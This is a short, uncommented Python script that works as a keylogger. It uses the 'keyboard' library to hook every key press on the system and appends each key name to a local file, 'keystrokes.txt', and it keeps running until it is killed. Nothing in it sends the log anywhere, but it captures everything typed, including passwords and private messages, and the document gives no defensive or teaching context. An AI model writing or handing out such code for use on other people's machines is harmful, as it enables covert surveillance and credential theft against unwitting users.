import keyboard
file= 'keystrokes.txt'
def key_press(key):
    with open(file, 'a') as f:
        f.write('{}\n'.format(key.name))
keyboard.on_press(key_press)
keyboard.wait()
